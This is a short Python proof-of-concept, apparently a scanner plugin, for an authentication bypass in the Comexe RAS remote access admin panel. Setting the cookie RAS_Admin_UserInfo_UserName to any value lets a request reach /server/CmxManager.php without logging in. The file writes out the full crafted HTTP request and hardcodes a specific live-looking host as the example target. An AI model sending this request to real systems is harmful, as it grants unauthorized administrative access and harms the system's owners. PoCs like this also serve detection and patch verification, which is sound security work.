#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name  : 科迈RAS远程快速接入方案后台登陆绕过
#Author    : 这个程序员不太冷
#Referer   : http://wooyun.org/bugs/wooyun-2015-0123807

def assign(service, arg):
     if service == "comexe_ras":
        return True, arg


def audit(arg):
    #当cookie中RAS_Admin_UserInfo_UserName=任意值，可以绕过登陆界面访问后台页面
    raw='''GET /server/CmxManager.php HTTP/1.1
Host: oa.escsi.cn:85
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://oa.escsi.cn:85/Client/CmxLogin.php?t=14524481767194
Cookie:  RAS_Admin_UserInfo_UserName=1
Connection: keep-alive

'''
    path="server/CmxManager.php"
    target = arg+path
    code, head, res, errcode, _ = curl.curl2(target,raw=raw)
    if code==200 and 'HREF="CmxManager.php"' in res and 'ID="CmxPgid_Directory"' in res:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('comexe_ras','http://oa.escsi.cn:85/')[1])